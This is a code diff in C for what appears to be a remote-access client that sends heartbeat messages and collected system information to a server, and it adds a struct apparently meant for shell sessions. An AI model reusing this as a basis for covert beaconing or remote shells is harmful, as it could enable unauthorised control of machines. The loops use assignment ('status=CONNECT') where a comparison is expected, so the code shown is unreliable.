@@ -55,6 +55,12 @@ struct CMSG{
         UINT32 l;
 };
 
+struct CSHELL{
+    char *token;
+    long begin; // 开始时候的时间戳
+    int thread;
+};
+
 
 
 
@@ -104,7 +110,6 @@ void MD5Final(MD5_CTX *context,unsigned char digest[16]);
 void MD5Transform(unsigned int state[4],unsigned char block[64]);
 void MD5Encode(unsigned char *output,unsigned int *input,unsigned int len);
 void MD5Decode(unsigned int *output,unsigned char *input,unsigned int len);
- 
 #endif
 
 unsigned char PADDING[]={0x80,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,
@@ -464,10 +469,10 @@ char* getSystemInfomation(char* systeminfo){
 /////////////////////////////////////////////////////////////
 void Hearts(void *sock){
     
-    while (1)
+    while (status=CONNECT)
     {
         printf("Hearts\n");
-        status=CONNECT;
+        
         struct CMSG msg = {
                 .sign =  SIGN,
                 .mod = SERVER_HEARTS,
@@ -480,6 +485,7 @@ void Hearts(void *sock){
             close((SOCKET)sock);
             break;
         }
+        status=CONNECT;
         Sleep(HEART_BEAT_TIME);
     }
     printf("End\n");
@@ -514,7 +520,7 @@ void Handle(){
     char  systeminfo[1024] ;
     getSystemInfomation(systeminfo);
     struct CMSG msg = {
-                .sign =  "customize",
+                .sign =  SIGN,
                 .mod = SERVER_SYSTEMINFO,
                 .l = (UINT32)strlen(systeminfo)
              };
@@ -562,8 +568,9 @@ void Handle(){
         }
     }
     free(address);
-    _beginthread(Hearts,0,(void *)sock);
     status=CONNECT;
+    uintptr_t hHearts = _beginthread(Hearts,0,(void *)sock);
+    
 
     while (status=CONNECT){
         
@@ -590,6 +597,7 @@ void Handle(){
         }
         free(address);
     }
+    
     close(sock);
     return;
 }
